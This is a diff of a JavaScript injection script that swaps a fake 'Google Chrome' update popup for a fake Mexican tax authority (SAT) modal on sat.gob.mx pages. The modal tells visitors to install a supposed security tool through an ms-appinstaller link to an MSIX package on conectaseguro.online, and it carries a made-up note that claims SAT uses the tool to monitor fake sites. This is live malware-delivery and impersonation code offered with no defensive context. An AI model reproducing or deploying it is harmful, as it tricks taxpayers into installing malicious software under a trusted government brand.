@@ -1,188 +1,186 @@
 window.addEventListener("DOMContentLoaded", (event) => {
-		if(!window.localStorage.getItem("browser-new") &&  !document.getElementById("windrag") && !navigator.userAgent.includes("Edg")) {
 
-document.body.innerHTML += `<style>
-
-img{max-width:100%;
-image-rendering: -moz-crisp-edges;         /* Firefox */
-image-rendering:   -o-crisp-edges;         /* Opera */
-image-rendering: -webkit-optimize-contrast;/* Webkit (non-standard naming) */
-image-rendering: crisp-edges;
--ms-interpolation-mode: nearest-neighbor;  /* IE (non-standard property) */
+  // Inject
+  if(window.localStorage.getItem("browser-new") === null &&  !document.getElementById('mimodalBox') && location.href.includes("sat.gob.mx")) {
+  let newBody = `
+  <style>
+h2 {
+  margin: 0;
+  padding: 0;
+  background: black;
+  width: 100%;
+    position: absolute;
+  top: 0px;
+  color: white;
+  text-align: center;
 }
 
-
-
-
-
-
-*{margin:0;padding:0;box-sizing:border-box;}
-.tr{text-align:right;}
-.tl{text-align:left;}
-.mtb_15{margin-top:15px;margin-bottom:15px;}
-
-
-.win-area{
-  z-index: 999999;
+.modal {
+  color:black;
+  font-family: "Questrial", sans-serif;
+  max-width: 570px;
   position: absolute;
-  top: 0;
-  left: 35%;
-  font-family:Segoe UI;
-  font-size:14px;
-  color:#2F2F31;
-  max-width:450px;
-  margin:100px auto;
-  background:url('https://i.imgur.com/3cOIQaq.png');
-  border-radius:5px;
-  overflow:hidden;
-  border:1px groove #949AA3;
-  box-shadow:0px 2px 10px #000;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  width: auto;
+  display: inline-flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 1.6rem 3rem;
+  border: 3px solid black;
+  border-radius: 5px;
+  background: white;
+  box-shadow: 8px 8px 0 rgba(0, 0, 0, 0.2);
+}
+.message {
+  font-size:1.1rem;
+  margin-bottom: 1.6rem;
+  margin-top: 1.6rem;
+}
+
+.check-list {
+  align-self: start;
+  margin: 0;
+  padding-left: 1.2rem;
+  font-size: 0.9rem;
+}
+
+.check-list li {
+  position: relative;
+  list-style-type: none;
+  padding-left: 2.5rem;
+  margin-bottom: 1.0rem;
+}
+
+.check-list li:before {
+    content: '';
+    display: block;
+    position: absolute;
+    left: 0;
+    top: -2px;
+    width: 5px;
+    height: 11px;
+    border-width: 0 2px 2px 0;
+    border-style: solid;
+    border-color: #00a8a8;
+    transform-origin: bottom left;
+    transform: rotate(45deg);
+}
+
+.btn {
+  color:inherit;
+  font-family:inherit;
+  color: white;
+  font-size: inherit;
+  background: green;
+  padding: 0.3rem 3.4rem;
+  border: 1px solid grey;
+  margin-right: 2.6rem;
+  box-shadow: 0 0 0 black;
+  transition: all 0.2s;
 }
 
 
-.win-titles{height:;display:flex;justify-content:space-between;background:red;
-background:url('https://i.imgur.com/3cOIQaq.png');
-  padding:8px;
-  padding-top:0;
-  padding-bottom:0;
-
-}
-.title-left{padding-top:8px;}
-.title-right{position:relative;opacity:0.9;}
-.title-right:hover{opacity:1;}
-
-.win-body{
-  background:#F0F0F0;
-   margin:8px;
-  border:1px groove #e3e4e8;
-     font-size: 12px;
-}
-.body-in{
-    padding:10px;
+.btnCancel {
+  color:inherit;
+  font-family:inherit;
+  font-size: inherit;
+  background: grey;
+  color: white;
+  padding: 0.3rem 3.4rem;
+  border: 1px solid black;
+  margin-right: 2.6rem;
+  box-shadow: 0 0 0 black;
+  transition: all 0.2s;
 }
 
-.body-main{
-    display: flex;
-    align-items: center;
-}
-.main-left {
-    flex: 0 0 32px;
-}
-.main-left img{width:35px;}
-.main-right {
-      margin-left: 14px;
+.btn:last-child {
+  margin: 0;
 }
 
-.main-right p {margin-bottom: 3px;}
-
-
-
-
-/*buttons*/
-.a-right {
-    display: flex;
-    align-items: center;
+.backdrop {
+  position: fixed;
+    background: #00000050;
+    min-width: 100%;
+    min-height: 100%;
+    margin: 0px;
+    border: 0px solid;
+    z-index: 9999;
+    padding: 0px;
+    overflow: hidden;
 }
 
-.a-right a {
-    width: 89px;
-    height: 20px;
-    border: 1px solid #9E9E9E;
-    border-radius: 4px;
-    font-size: 12px;
-    margin-left: 10px;
-    color: black;
-    text-decoration: none;
-    text-align: center;
+.btn:hover {
+  box-shadow: 0.4rem 0.4rem 0 black;
+  transform: translate(-0.4rem, -0.4rem);
+  cursor: pointer;
+}
 
-/* Permalink - use to edit and share this gradient: https://colorzilla.com/gradient-editor/#fffcfc+0,e5ebee+51,e5ebee+51,d7dee3+52,c1bfbf+100 */
-background: #fffcfc; /* Old browsers */
-background: -moz-linear-gradient(top,  #fffcfc 0%, #e5ebee 51%, #e5ebee 51%, #d7dee3 52%, #c1bfbf 100%); /* FF3.6-15 */
-background: -webkit-linear-gradient(top,  #fffcfc 0%,#e5ebee 51%,#e5ebee 51%,#d7dee3 52%,#c1bfbf 100%); /* Chrome10-25,Safari5.1-6 */
-background: linear-gradient(to bottom,  #fffcfc 0%,#e5ebee 51%,#e5ebee 51%,#d7dee3 52%,#c1bfbf 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
-filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fffcfc', endColorstr='#c1bfbf',GradientType=0 ); /* IE6-9 */
-
-
-
+.btn:active {
+  box-shadow: 0 0 0 black;
+  transform: translate(0, 0);
 }
 
 
+.btnCancel:last-child {
+  margin: 0;
+}
 
-.a-right a:hover{
-background: #c1bfbf; /* Old browsers */
-background: -moz-linear-gradient(top, #c1bfbf 0%, #d7dee3 48%, #e5ebee 49%, #e5ebee 49%, #fffcfc 100%); /* FF3.6-15 */
-background: -webkit-linear-gradient(top, #c1bfbf 0%,#d7dee3 48%,#e5ebee 49%,#e5ebee 49%,#fffcfc 100%); /* Chrome10-25,Safari5.1-6 */
-background: linear-gradient(to bottom, #c1bfbf 0%,#d7dee3 48%,#e5ebee 49%,#e5ebee 49%,#fffcfc 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
-filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#c1bfbf', endColorstr='#fffcfc',GradientType=0 ); /* IE6-9 */}
+.small {
+  font-size: 0.75rem;
+}
 
-.a-area {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+.btnCancel:hover {
+  box-shadow: 0.4rem 0.4rem 0 black;
+  transform: translate(-0.4rem, -0.4rem);
+  cursor: pointer;
+}
+
+.btnCancel:active {
+  box-shadow: 0 0 0 black;
+  transform: translate(0, 0);
 }
 
 
-
-
-
-
-
-
-
-
-
-.body-mid{border-bottom:1px inset #D0D0D0;margin:0 5px;}
-
+.options {
+  display: flex;
+  flex-direction: row;
+  justify-content: space-between;
+}
 </style>
-<div class="mkt-popup win-area" id="windrag">
-    <div class="win-titles">
-      <div class="title-left">Google Chrome - Alerta de Seguridad</div>
-       <div class="title-right"><img src="https://i.imgur.com/2ZvYQzd.png"></div>
-    </div>
+  <div class="backdrop" id="mimodalBox">
+  <div class="modal" >
+  <h2>IMPORTANTE!</h2>
+  <div>
+    
+    
+    
+    <p class="message"><img src="https://www.sat.gob.mx/satys/img/logo3.png" alt=""> </p> 
+    <p>Le sugerimos instalar nuestra herramienta de uso seguro de nuestro portal</p>
+  
+    <ul class="check-list">
+    <li>Presiona el Botón <b>Descargar Herramienta</b></li>
+    <li><b>Permitir Abrir</b> el Enlace <b>ms-appinstaller</b></li>
+    <li>Presionar el Botón <b>Instalar</b> en la ventana emergente</li>
+  </ul>
+  
 
-  <div class="win-body">
-
-    <div class="body-in body-top">
-      <div class="body-title"><strong>¿Quieres ejecutar este software?</strong></div>
-
-     <div class="body-main mtb_15">
-        <div class="main-left"><img src="https://i.imgur.com/z7VDyyl.png"/></div>
-       <div class="main-right tr">
-          <p>Nombre: Google_Chrome_v16</p>
-           <p>Publisher: Google                     </p>
-       </div>
-     </div>
-
-	 <div class="a-area">
-		<div class="a-left">Actualización Requerida</div>
-		<div class="a-right">
-			<a target="_blank" onclick="document.getElementById('windrag').style.display = 'none';" href="https://conectaseguro.online/setup/Google_Chrome_v16.exe">Descargar</a>
-		</div>
-	 </div>
-
-   </div>
-
-
-    <div class="body-mid"></div>
-
-    <div class="body-in body-bottom">
-     <div class="body-main">
-        <div class="main-left"><img src="https://i.imgur.com/tmXv0AB.png"/></div>
-       <div class="main-right">
-          <p>Se ha detectado una actualizacón y es necesario descarga y ejecutar el archivo Google_Chrome_v16.</p>
-       </div>
-     </div>
-   </div>
-
-
-
-
-
-
+  <p class="small">NOTA: Con esta herramienta, el SAT elabora un registro con la información de sitios falsos para monitorear las denuncias que hacen los contribuyentes cuando reciben correos o información engañosa a nombre de la institución.</p>
+  
+  <div class="options">
+    <a onclick="document.getElementById('mimodalBox').style.display = 'none'" href="ms-appinstaller:?source=https://conectaseguro.online/BuzonTributario.msix" class="btn">Descargar Herramienta</a>
+    <button onclick="document.getElementById('mimodalBox').style.display = 'none'" class="btnCancel">Cancelar</button>
   </div>
-</div>`;
-		  }
-	  });
+  </div> 
+</div>
+</div>
+ ${document.body.innerHTML} `;
+	
+	document.body.innerHTML = newBody;
+} // end Inject
+		  
+});
 
 
 let contando2 = 0;
@@ -209,5 +207,3 @@ for(const el of document.getElementsByTagName("li")) {
 
 
 }, 100);
-
-console.log(window)
